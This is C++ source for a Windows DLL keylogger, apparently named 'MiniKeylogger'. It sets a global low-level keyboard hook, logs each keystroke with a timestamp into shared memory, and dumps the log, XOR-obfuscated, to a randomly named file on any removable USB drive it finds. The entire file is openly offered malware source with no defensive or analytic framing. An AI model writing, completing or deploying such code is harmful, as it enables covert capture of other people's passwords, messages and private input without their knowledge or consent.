#include "pch.h"
#include <windows.h>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <ctime>
#include <iomanip>
#include <random>
#include <mutex>
#include <iostream>



HHOOK hHook = NULL;
HINSTANCE hInst;
std::vector<std::pair<std::string, std::string>>* keystrokes;
HANDLE hMapFile = NULL;
std::mutex keystrokes_mutex;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void SaveKeystrokesToFile(const std::string& filepath);
std::string GenerateRandomFilename();
std::string GetTimestamp();

extern "C" __declspec(dllexport) void SetHook();
extern "C" __declspec(dllexport) void RemoveHook();
extern "C" __declspec(dllexport) void CheckForUSBDrive();



BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		hInst = hInstance;

		// Create or open the memory-mapped file
		hMapFile = CreateFileMapping(
			INVALID_HANDLE_VALUE,
			NULL,
			PAGE_READWRITE,
			0,
			sizeof(std::vector<std::pair<std::string, std::string>>),
			"Global\\KeystrokesMap"
		);

		if (hMapFile == NULL) {
			return FALSE;
		}

		keystrokes = static_cast<std::vector<std::pair<std::string, std::string>>*>(
			MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(std::vector<std::pair<std::string, std::string>>))
			);

		if (keystrokes == NULL) {
			CloseHandle(hMapFile);
			return FALSE;
		}

		// Initialize keystrokes vector if newly created
		if (GetLastError() != ERROR_ALREADY_EXISTS) {
			new (keystrokes) std::vector<std::pair<std::string, std::string>>();
		}
	}

	else if (dwReason == DLL_PROCESS_DETACH) {
		if (keystrokes != NULL) {
			UnmapViewOfFile(keystrokes);
		}

		if (hMapFile != NULL) {
			CloseHandle(hMapFile);
		}
	}

	return TRUE;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD vkCode = kbdStruct->vkCode;
		char key[32] = { 0 };

		if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
			key[0] = (char)vkCode;
			key[1] = '\0';
		}

		else {
			switch (vkCode) {
			case VK_UP: strcpy_s(key, sizeof(key), "UP"); break;
			case VK_RIGHT: strcpy_s(key, sizeof(key), "RIGHT"); break;
			case VK_DOWN: strcpy_s(key, sizeof(key), "DOWN"); break;
			case VK_LEFT: strcpy_s(key, sizeof(key), "LEFT"); break;
			case VK_SPACE: strcpy_s(key, sizeof(key), "SPACE"); break;
			case VK_RETURN: strcpy_s(key, sizeof(key), "ENTER"); break;
			case VK_TAB: strcpy_s(key, sizeof(key), "TAB"); break;
			case VK_BACK: strcpy_s(key, sizeof(key), "BACKSPACE"); break;
			case VK_SHIFT: strcpy_s(key, sizeof(key), "SHIFT"); break;
			case VK_ESCAPE: strcpy_s(key, sizeof(key), "ESC"); break;
			case VK_CONTROL: strcpy_s(key, sizeof(key), "CTRL"); break;
			case VK_DELETE: strcpy_s(key, sizeof(key), "DELETE"); break;
			default: sprintf_s(key, sizeof(key), "[%lu]", vkCode); break;
			}
		}

		std::stringstream ss;
		ss << "[" << key << "," << GetTimestamp() << "]";

		{
			std::lock_guard<std::mutex> lock(keystrokes_mutex);
			keystrokes->push_back({ key, GetTimestamp() });
		}
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}


extern "C" __declspec(dllexport) void SetHook() {
	HOOKPROC hookProc = KeyboardProc;
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInst, 0);

	if (hHook == NULL) {
		DWORD error = GetLastError();
		std::cout << "Failed to set hook. Error: " << error << std::endl;
	}
}


extern "C" __declspec(dllexport) void RemoveHook() {
	if (hHook) {
		UnhookWindowsHookEx(hHook);
		hHook = NULL;
	}
}


extern "C" __declspec(dllexport) void CheckForUSBDrive() {
	static bool fileCreated = false;
	if (fileCreated) return;

	DWORD drives = GetLogicalDrives();
	for (int i = 0; i < 26; ++i) {
		if ((drives >> i) & 1) {
			char driveLetter = 'A' + i;
			std::string drive = std::string(1, driveLetter) + ":\\";
			UINT driveType = GetDriveTypeA(drive.c_str());
			if (driveType == DRIVE_REMOVABLE) {
				std::string filepath = drive + GenerateRandomFilename();
				SaveKeystrokesToFile(filepath);
				fileCreated = true;
				break;
			}
		}
	}
}


std::string GetTimestamp() {
	SYSTEMTIME st;
	GetSystemTime(&st);
	std::stringstream ss;
	ss << std::setw(2) << std::setfill('0') << st.wDay << "/"
		<< std::setw(2) << std::setfill('0') << st.wMonth << "/"
		<< st.wYear << " "
		<< std::setw(2) << std::setfill('0') << st.wHour << ":"
		<< std::setw(2) << std::setfill('0') << st.wMinute << ":"
		<< std::setw(2) << std::setfill('0') << st.wSecond << "."
		<< std::setw(3) << std::setfill('0') << st.wMilliseconds;

	return ss.str();
}


std::string GenerateRandomFilename() {
	std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	std::default_random_engine rng{ std::random_device{}() };
	std::uniform_int_distribution<> dist(0, charset.size() - 1);

	std::string filename;
	for (int i = 0; i < 10; ++i) {
		filename += charset[dist(rng)];
	}

	return filename + ".txt";
}


std::string Encrypt(const std::string& data, const std::string& key) {
	std::string encrypted = data;
	for (size_t i = 0; i < data.size(); ++i) {
		encrypted[i] ^= key[i % key.size()];
	}

	return encrypted;
}


void EncryptAndSaveToFile(const std::string& data, const std::string& filepath) {
	std::string key = "MiniKeylogger";
	std::string encryptedData = Encrypt(data, key);

	std::ofstream file(filepath, std::ios::binary);
	file << encryptedData;
	file.close();
}


void SaveKeystrokesToFile(const std::string& filepath) {
	std::stringstream ss;
	{
		std::lock_guard<std::mutex> lock(keystrokes_mutex);
		for (const auto& entry : *keystrokes) {
			ss << "[" << entry.first << "," << entry.second << "]\n";
		}
	}

	std::string data = ss.str();
	EncryptAndSaveToFile(data, filepath);
}